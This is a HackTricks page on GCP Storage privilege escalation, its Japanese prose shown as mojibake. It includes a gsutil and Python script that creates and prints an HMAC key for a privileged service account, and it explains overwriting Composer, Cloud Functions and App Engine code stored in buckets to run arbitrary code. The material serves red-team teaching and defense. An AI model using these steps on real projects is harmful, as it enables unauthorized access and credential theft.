# GCP - Storage Privesc

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="../../../.gitbook/assets/image.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../.gitbook/assets/image.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** ğŸ’¬ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## Storage

åŸºæœ¬æƒ…å ±:

{% content-ref url="../gcp-services/gcp-storage-enum.md" %}
[gcp-storage-enum.md](../gcp-services/gcp-storage-enum.md)
{% endcontent-ref %}

### `storage.objects.get`

ã“ã®æ¨©é™ã¯ã€**Cloud Storageå†…ã«ä¿å­˜ã•ã‚ŒãŸãƒ•ã‚¡ã‚¤ãƒ«ã‚’ãƒ€ã‚¦ãƒ³ãƒ­ãƒ¼ãƒ‰ã™ã‚‹**ã“ã¨ã‚’è¨±å¯ã—ã¾ã™ã€‚ã“ã‚Œã¯ã€å ´åˆã«ã‚ˆã£ã¦ã¯**æ©Ÿå¯†æƒ…å ±ãŒãã“ã«ä¿å­˜ã•ã‚Œã¦ã„ã‚‹ãŸã‚ã€æ¨©é™ã‚’æ˜‡æ ¼ã•ã›ã‚‹**å¯èƒ½æ€§ãŒã‚ã‚Šã¾ã™ã€‚ã•ã‚‰ã«ã€ã„ãã¤ã‹ã®GCPã‚µãƒ¼ãƒ“ã‚¹ã¯ã€ãƒã‚±ãƒƒãƒˆã«æƒ…å ±ã‚’ä¿å­˜ã—ã¾ã™:

* **GCP Composer**: Composerç’°å¢ƒã‚’ä½œæˆã™ã‚‹ã¨ã€**ã™ã¹ã¦ã®DAGã®ã‚³ãƒ¼ãƒ‰**ãŒ**ãƒã‚±ãƒƒãƒˆ**å†…ã«ä¿å­˜ã•ã‚Œã¾ã™ã€‚ã“ã‚Œã‚‰ã®ã‚¿ã‚¹ã‚¯ã¯ã€ãã®ã‚³ãƒ¼ãƒ‰å†…ã«èˆˆå‘³æ·±ã„æƒ…å ±ã‚’å«ã‚€å¯èƒ½æ€§ãŒã‚ã‚Šã¾ã™ã€‚
* **GCR (Container Registry)**: ã‚³ãƒ³ãƒ†ãƒŠã®**ã‚¤ãƒ¡ãƒ¼ã‚¸**ã¯**ãƒã‚±ãƒƒãƒˆ**å†…ã«ä¿å­˜ã•ã‚Œã¦ãŠã‚Šã€ãƒã‚±ãƒƒãƒˆã‚’èª­ã¿å–ã‚‹ã“ã¨ãŒã§ãã‚Œã°ã€ã‚¤ãƒ¡ãƒ¼ã‚¸ã‚’ãƒ€ã‚¦ãƒ³ãƒ­ãƒ¼ãƒ‰ã—ã€**æ¼æ´©ã‚„ã‚½ãƒ¼ã‚¹ã‚³ãƒ¼ãƒ‰ã‚’æ¤œç´¢ã™ã‚‹**ã“ã¨ãŒã§ãã¾ã™ã€‚

### `storage.objects.setIamPolicy`

ã“ã®æ¨©é™ã‚’ä½¿ç”¨ã—ã¦ã€**ã“ã®ã‚»ã‚¯ã‚·ãƒ§ãƒ³ã®ä»¥å‰ã®ã‚·ãƒŠãƒªã‚ªã‚’æ‚ªç”¨ã™ã‚‹**ã“ã¨ãŒã§ãã¾ã™ã€‚

### **`storage.buckets.setIamPolicy`**

ã“ã®æ¨©é™ã§ã®æ¨©é™ã®å¤‰æ›´æ–¹æ³•ã«ã¤ã„ã¦ã¯ã€æ¬¡ã®ãƒšãƒ¼ã‚¸ã‚’ç¢ºèªã—ã¦ãã ã•ã„:

{% content-ref url="../gcp-unaunthenticated-enum-and-access/gcp-storage-unauthenticated-enum/gcp-public-buckets-privilege-escalation.md" %}
[gcp-public-buckets-privilege-escalation.md](../gcp-unaunthenticated-enum-and-access/gcp-storage-unauthenticated-enum/gcp-public-buckets-privilege-escalation.md)
{% endcontent-ref %}

### `storage.hmacKeys.create`

Cloud Storageã®ã€Œç›¸äº’é‹ç”¨æ€§ã€æ©Ÿèƒ½ã¯ã€AWS S3ãªã©ã®**ã‚¯ãƒ­ã‚¹ã‚¯ãƒ©ã‚¦ãƒ‰ã‚¤ãƒ³ã‚¿ãƒ©ã‚¯ã‚·ãƒ§ãƒ³**ã®ãŸã‚ã«è¨­è¨ˆã•ã‚Œã¦ãŠã‚Šã€**ã‚µãƒ¼ãƒ“ã‚¹ã‚¢ã‚«ã‚¦ãƒ³ãƒˆã¨ãƒ¦ãƒ¼ã‚¶ãƒ¼ã®HMACã‚­ãƒ¼ã®ä½œæˆ**ã‚’å«ã¿ã¾ã™ã€‚æ”»æ’ƒè€…ã¯ã€**æ¨©é™ã®ã‚ã‚‹ã‚µãƒ¼ãƒ“ã‚¹ã‚¢ã‚«ã‚¦ãƒ³ãƒˆã®HMACã‚­ãƒ¼ã‚’ç”Ÿæˆã™ã‚‹ã“ã¨ã«ã‚ˆã£ã¦ã€Cloud Storageå†…ã§æ¨©é™ã‚’æ˜‡æ ¼ã•ã›ã‚‹**ã“ã¨ãŒã§ãã¾ã™ã€‚ãƒ¦ãƒ¼ã‚¶ãƒ¼ã«é–¢é€£ä»˜ã‘ã‚‰ã‚ŒãŸHMACã‚­ãƒ¼ã¯ã‚¦ã‚§ãƒ–ã‚³ãƒ³ã‚½ãƒ¼ãƒ«ã‚’ä»‹ã—ã¦ã®ã¿å–å¾—å¯èƒ½ã§ã™ãŒã€ã‚¢ã‚¯ã‚»ã‚¹ã‚­ãƒ¼ã¨ã‚·ãƒ¼ã‚¯ãƒ¬ãƒƒãƒˆã‚­ãƒ¼ã¯**æ°¸ç¶šçš„ã«ã‚¢ã‚¯ã‚»ã‚¹å¯èƒ½**ã§ã‚ã‚Šã€ãƒãƒƒã‚¯ã‚¢ãƒƒãƒ—ã‚¢ã‚¯ã‚»ã‚¹ã‚¹ãƒˆãƒ¬ãƒ¼ã‚¸ã®å¯èƒ½æ€§ã‚’æä¾›ã—ã¾ã™ã€‚ä¸€æ–¹ã€ã‚µãƒ¼ãƒ“ã‚¹ã‚¢ã‚«ã‚¦ãƒ³ãƒˆã«ãƒªãƒ³ã‚¯ã•ã‚ŒãŸHMACã‚­ãƒ¼ã¯APIçµŒç”±ã§ã‚¢ã‚¯ã‚»ã‚¹å¯èƒ½ã§ã™ãŒã€ä½œæˆå¾Œã¯ãã®ã‚¢ã‚¯ã‚»ã‚¹ã‚­ãƒ¼ã¨ã‚·ãƒ¼ã‚¯ãƒ¬ãƒƒãƒˆã‚­ãƒ¼ã¯å–å¾—ã§ããšã€ç¶™ç¶šçš„ãªã‚¢ã‚¯ã‚»ã‚¹ã®ãŸã‚ã®è¤‡é›‘ã•ã‚’è¿½åŠ ã—ã¾ã™ã€‚

{% code overflow="wrap" %}
```bash
# Create key
gsutil hmac create <sa-email> # You might need to execute this inside a VM instance

## If you have TROUBLES creating the HMAC key this was you can also do it contacting the API directly:
PROJECT_ID = '$PROJECT_ID'
TARGET_SERVICE_ACCOUNT = f"exam-storage-sa-read-flag-3@{PROJECT_ID}.iam.gserviceaccount.com"
ACCESS_TOKEN = "$CLOUDSDK_AUTH_ACCESS_TOKEN"
import requests
import json
key = requests.post(
f'https://www.googleapis.com/storage/v1/projects/{PROJECT_ID}/hmacKeys',
params={'access_token': ACCESS_TOKEN, 'serviceAccountEmail': TARGET_SERVICE_ACCOUNT}
).json()
#print(json.dumps(key, indent=4))
print(f'ID: {key["metadata"]["accessId"]}')
print(f'Secret: {key["secret"]}')


# Configure gsutil to use the HMAC key
gcloud config set pass_credentials_to_gsutil false
gsutil config -a

# Use it
gsutil ls gs://[BUCKET_NAME]

# Restore
gcloud config set pass_credentials_to_gsutil true
```
{% endcode %}

ã“ã®æ–¹æ³•ã®åˆ¥ã®ã‚¨ã‚¯ã‚¹ãƒ—ãƒ­ã‚¤ãƒˆã‚¹ã‚¯ãƒªãƒ—ãƒˆã¯[ã“ã¡ã‚‰](https://github.com/RhinoSecurityLabs/GCP-IAM-Privilege-Escalation/blob/master/ExploitScripts/storage.hmacKeys.create.py)ã§è¦‹ã¤ã‘ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚

## `storage.objects.create`, `storage.objects.delete` = ã‚¹ãƒˆãƒ¬ãƒ¼ã‚¸æ›¸ãè¾¼ã¿æ¨©é™

ãƒã‚±ãƒƒãƒˆå†…ã«**æ–°ã—ã„ã‚ªãƒ–ã‚¸ã‚§ã‚¯ãƒˆã‚’ä½œæˆã™ã‚‹**ã«ã¯`storage.objects.create`ãŒå¿…è¦ã§ã€[ãƒ‰ã‚­ãƒ¥ãƒ¡ãƒ³ãƒˆ](https://cloud.google.com/storage/docs/access-control/iam-permissions#object\_permissions)ã«ã‚ˆã‚‹ã¨ã€æ—¢å­˜ã®ã‚ªãƒ–ã‚¸ã‚§ã‚¯ãƒˆã‚’**å¤‰æ›´ã™ã‚‹**ã«ã¯`storage.objects.delete`ã‚‚å¿…è¦ã§ã™ã€‚

ã‚¯ãƒ©ã‚¦ãƒ‰ã«æ›¸ãè¾¼ã‚€ã“ã¨ãŒã§ãã‚‹ãƒã‚±ãƒƒãƒˆã®**éå¸¸ã«ä¸€èˆ¬çš„ãªæ‚ªç”¨**ã¯ã€**ãƒã‚±ãƒƒãƒˆãŒã‚¦ã‚§ãƒ–ã‚µãƒ¼ãƒãƒ¼ãƒ•ã‚¡ã‚¤ãƒ«ã‚’ä¿å­˜ã—ã¦ã„ã‚‹å ´åˆ**ã§ã‚ã‚Šã€ã‚¦ã‚§ãƒ–ã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³ã§ä½¿ç”¨ã•ã‚Œã‚‹**æ–°ã—ã„ã‚³ãƒ¼ãƒ‰ã‚’ä¿å­˜ã§ãã‚‹**å¯èƒ½æ€§ãŒã‚ã‚Šã¾ã™ã€‚

### Composer

**Composer**ã¯GCPå†…ã§ç®¡ç†ã•ã‚Œã¦ã„ã‚‹**Apache Airflow**ã§ã™ã€‚ã„ãã¤ã‹ã®èˆˆå‘³æ·±ã„æ©Ÿèƒ½ãŒã‚ã‚Šã¾ã™ï¼š

* **GKEã‚¯ãƒ©ã‚¹ã‚¿ãƒ¼å†…ã§å®Ÿè¡Œã•ã‚Œã‚‹**ãŸã‚ã€**ã‚¯ãƒ©ã‚¹ã‚¿ãƒ¼ãŒä½¿ç”¨ã™ã‚‹SAã¯Composerå†…ã§å®Ÿè¡Œã•ã‚Œã‚‹ã‚³ãƒ¼ãƒ‰ã‹ã‚‰ã‚¢ã‚¯ã‚»ã‚¹å¯èƒ½**ã§ã™ã€‚
* **ã‚³ãƒ¼ãƒ‰ã‚’ãƒã‚±ãƒƒãƒˆã«ä¿å­˜ã™ã‚‹**ãŸã‚ã€**ãã®ãƒã‚±ãƒƒãƒˆã«æ›¸ãè¾¼ã¿ã‚¢ã‚¯ã‚»ã‚¹ã‚’æŒã¤èª°ã§ã‚‚**DGAã‚³ãƒ¼ãƒ‰ï¼ˆApache AirflowãŒå®Ÿè¡Œã™ã‚‹ã‚³ãƒ¼ãƒ‰ï¼‰ã‚’å¤‰æ›´/è¿½åŠ ã§ãã‚‹ã“ã¨ã«ãªã‚Šã¾ã™ã€‚\
ãã®ãŸã‚ã€**ComposerãŒã‚³ãƒ¼ãƒ‰ã‚’ä¿å­˜ã™ã‚‹ãƒã‚±ãƒƒãƒˆã«æ›¸ãè¾¼ã¿ã‚¢ã‚¯ã‚»ã‚¹ãŒã‚ã‚‹å ´åˆ**ã€**GKEã‚¯ãƒ©ã‚¹ã‚¿ãƒ¼ã§å®Ÿè¡Œã•ã‚Œã¦ã„ã‚‹SAã«æ¨©é™æ˜‡æ ¼ã§ãã¾ã™**ã€‚

### Cloud Functions

* Cloud Functionsã®ã‚³ãƒ¼ãƒ‰ã¯ã‚¹ãƒˆãƒ¬ãƒ¼ã‚¸ã«ä¿å­˜ã•ã‚Œã¦ã„ã‚‹ãŸã‚ã€**ä¸Šæ›¸ãã™ã‚‹ã“ã¨ã§ä»»æ„ã®ã‚³ãƒ¼ãƒ‰ã‚’å®Ÿè¡Œã™ã‚‹ã“ã¨ãŒå¯èƒ½ã§ã™**ã€‚

### App Engine

* App Engineã®ã‚½ãƒ¼ã‚¹ã‚³ãƒ¼ãƒ‰ã¯ãƒã‚±ãƒƒãƒˆã«ä¿å­˜ã•ã‚Œã¦ãŠã‚Šã€**ã‚³ãƒ¼ãƒ‰ã‚’ä¸Šæ›¸ãã™ã‚‹ã“ã¨ã§ä»»æ„ã®ã‚³ãƒ¼ãƒ‰ã‚’å®Ÿè¡Œã™ã‚‹ã“ã¨ãŒå¯èƒ½ã§ã™ã€‚ã“ã‚Œã¯ä¸å¯èƒ½ã§ã™**ã€‚
* **ã‚³ãƒ³ãƒ†ãƒŠãƒ¬ã‚¤ãƒ¤ãƒ¼ãŒãƒã‚±ãƒƒãƒˆã«ä¿å­˜ã•ã‚Œã¦ã„ã‚‹ã‚ˆã†ã§ã™ã€‚ã“ã‚Œã‚’å¤‰æ›´ã™ã‚‹ã“ã¨ã¯ã§ãã‚‹ã§ã—ã‚‡ã†ã‹ï¼Ÿ**

### GCR

* **Google Container Registry**ã¯ãƒã‚±ãƒƒãƒˆå†…ã«ã‚¤ãƒ¡ãƒ¼ã‚¸ã‚’ä¿å­˜ã—ã¦ãŠã‚Šã€**ã“ã‚Œã‚‰ã®ãƒã‚±ãƒƒãƒˆã«æ›¸ãè¾¼ã‚€ã“ã¨ãŒã§ãã‚Œã°ã€**ãã‚Œã‚‰ã®ãƒã‚±ãƒƒãƒˆãŒå®Ÿè¡Œã•ã‚Œã¦ã„ã‚‹å ´æ‰€ã«æ¨ªç§»å‹•ã§ãã‚‹å¯èƒ½æ€§ãŒã‚ã‚Šã¾ã™**ã€‚
* GCRãŒä½¿ç”¨ã™ã‚‹ãƒã‚±ãƒƒãƒˆã®URLã¯`gs://<eu/usa/asia/nothing>.artifacts.<project>.appspot.com`ã®ã‚ˆã†ã«ãªã‚Šã¾ã™ï¼ˆãƒˆãƒƒãƒ—ãƒ¬ãƒ™ãƒ«ã®ã‚µãƒ–ãƒ‰ãƒ¡ã‚¤ãƒ³ã¯[ã“ã¡ã‚‰](https://cloud.google.com/container-registry/docs/pushing-and-pulling)ã§æŒ‡å®šã•ã‚Œã¦ã„ã¾ã™ï¼‰ã€‚

## **å‚è€ƒæ–‡çŒ®**

* [https://rhinosecuritylabs.com/cloud-security/privilege-escalation-google-cloud-platform-part-2/#:\~:text=apiKeys.-,create,privileges%20than%20our%20own%20user.](https://rhinosecuritylabs.com/cloud-security/privilege-escalation-google-cloud-platform-part-2/)

{% hint style="success" %}
AWSãƒãƒƒã‚­ãƒ³ã‚°ã‚’å­¦ã³ã€ç·´ç¿’ã™ã‚‹ï¼š<img src="../../../.gitbook/assets/image.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../.gitbook/assets/image.png" alt="" data-size="line">\
GCPãƒãƒƒã‚­ãƒ³ã‚°ã‚’å­¦ã³ã€ç·´ç¿’ã™ã‚‹ï¼š<img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricksã‚’ã‚µãƒãƒ¼ãƒˆã™ã‚‹</summary>

* [**ã‚µãƒ–ã‚¹ã‚¯ãƒªãƒ—ã‚·ãƒ§ãƒ³ãƒ—ãƒ©ãƒ³**](https://github.com/sponsors/carlospolop)ã‚’ç¢ºèªã—ã¦ãã ã•ã„ï¼
* **ğŸ’¬ [**Discordã‚°ãƒ«ãƒ¼ãƒ—**](https://discord.gg/hRep4RUj7f)ã¾ãŸã¯[**ãƒ†ãƒ¬ã‚°ãƒ©ãƒ ã‚°ãƒ«ãƒ¼ãƒ—**](https://t.me/peass)ã«å‚åŠ ã™ã‚‹ã‹ã€**Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**ã‚’ãƒ•ã‚©ãƒ­ãƒ¼ã—ã¦ãã ã•ã„ã€‚**
* **ãƒãƒƒã‚­ãƒ³ã‚°ã®ãƒˆãƒªãƒƒã‚¯ã‚’å…±æœ‰ã™ã‚‹ã«ã¯ã€[**HackTricks**](https://github.com/carlospolop/hacktricks)ãŠã‚ˆã³[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)ã®GitHubãƒªãƒã‚¸ãƒˆãƒªã«PRã‚’æå‡ºã—ã¦ãã ã•ã„ã€‚**

</details>
{% endhint %}
